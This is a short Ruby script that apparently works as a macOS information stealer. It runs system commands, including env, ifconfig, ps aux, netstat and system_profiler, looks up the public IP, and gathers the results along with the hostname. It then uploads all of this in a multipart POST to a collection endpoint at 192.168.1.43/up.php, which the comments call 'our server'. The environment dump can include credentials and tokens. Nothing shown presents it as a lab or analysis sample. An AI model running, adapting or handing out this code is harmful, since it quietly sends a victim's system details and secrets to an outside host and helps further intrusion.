require 'net/http'
require 'uri'
require 'open-uri'

# getting the hostname of the mac computer
filename = "Macintosh_"+%x( hostname )

# list of commands to be executed
cmds=[
 ["System name","uname -a"],
 ["Environment","env"],
 ["Network info","ifconfig"],
 ["Processes","ps aux"],
 ["Open ports","netstat -aln | grep LISTEN"],
 ["System information","system_profiler -detailLevel mini"]  
]

# getting the public IP address
s="Public IP:\n"+open("http://ipecho.net/plain").read+"\n"

# executing the list of commands
cmds.each do |cmd|
  s += cmd[0] + ":\n" + %x( #{cmd[1]} )
end 

# uploading the information to our server
uri = URI.parse("http://192.168.1.43/up.php")
boundary="Mac2017x"

header={"Content-Type" => "multipart/form-data, boundary=#{boundary}"}
post_body=[]

post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"system-info\";filename=\"#{filename}\"\r\n"
post_body << "Content-Type: text/plain\r\n\r\n"
post_body << s
post_body << "\r\n\r\n--#{boundary}--\r\n"

http = Net::HTTP.new(uri.host,uri.port)
request = Net::HTTP::Post.new(uri.request_uri,header)
request.body = post_body.join

response = http.request(request)
